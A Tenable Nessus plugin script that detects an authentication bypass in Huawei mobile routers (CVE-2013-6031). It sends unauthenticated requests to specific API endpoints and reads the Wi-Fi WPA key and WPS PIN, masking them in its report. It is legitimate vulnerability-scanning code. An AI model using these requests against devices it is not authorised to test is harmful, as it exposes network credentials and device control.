#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73155);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/02/07 18:43:41 $");

  script_cve_id("CVE-2013-6031");
  script_bugtraq_id(66017, 66065);
  script_osvdb_id(104165, 104432, 104433);
  script_xref(name:"CERT", value:"341526");
  script_xref(name:"EDB-ID", value:"32161");

  script_name(english:"Huawei Multiple Device Authentication Bypass");
  script_summary(english:"Tries to exploit authentication bypass vulnerability");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote device is affected by an authentication bypass
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote Huawei device is affected by an authentication bypass
vulnerability.  Nessus was able to exploit this vulnerability to gain
access to sensitive information on the device (such as the WPA preshared
key).  A remote attacker could exploit this flaw to perform
administrative functions on the device."
  );
  # http://consumer.huawei.com/en/support/downloads/detail/index.htm?id=18503
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fb101ddb");
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140307-0_Huawei_E5331_MiFi_Unauthenticated_access_and_settings_modifications_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1d7f5eab");
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the appropriate firmware update, or restrict access to the device
if an update is not available."
  );
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/03/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/03/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:huawei:e355");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:huawei:e355_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 443);
  script_require_keys("www/ipwebs");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

get_kb_item_or_exit("www/ipwebs");

port = get_http_port(default:80, embedded:TRUE);

server_name = http_server_header(port:port);
if (stridx(server_name,"IPWEBS/") != 0) audit(AUDIT_NOT_LISTEN, "A Huawei router web server", port);

check_list =
  make_array("/api/wlan/security-settings", "WifiWpapsk",
             "/api/wlan/wps", "WPSPin",
             "/api/device/information", "WebUIVersion");

report = '';

foreach check (keys(check_list))
{
  res = http_send_recv3(item         : check,
                        method       : "GET",
                        port         : port,
                        exit_on_fail : TRUE);

  start_tag = '<' + check_list[check] + '>';
  end_tag = '</' + check_list[check] + '>';

  if (
    '<?xml version="1.0" encoding="UTF-8"?>' >< res[2] &&
    '<response>' ><  res[2] && '</response>' >< res[2] &&
    start_tag >< res[2] && end_tag >< res[2]
  )
  {
    # we need to sanitize output for everything except information page
    if ('information' >!< check)
    {
      item = eregmatch(pattern: start_tag + "([^<]+)",
                       string: res[2]);
      if (!isnull(item) && !isnull(item[1]))
      {
        tmp = item[1];
        if (strlen(tmp) <= 2)
          sanitized = crap(data:'*', length:6);
        else
          sanitized = tmp[0] + crap(data:'*', length:6) + tmp[strlen(tmp)-1];

        report += '\n  URL : ' + build_url(port:port, qs:check) +
                  '\n  ' + check_list[check] + ' : ' + sanitized + '\n';
      }
    }
    else
    {
      report += '\n  URL : ' + build_url(port:port, qs:check) +
                '\n  Information XML Contents :\n\n' + chomp(res[2]) + '\n';
    }
  }
}

if (report != '')
{
  if (report_verbosity > 0) security_hole(port:port, extra:report);
  else security_hole(port);
}
else audit(AUDIT_LISTEN_NOT_VULN, "web server", port);
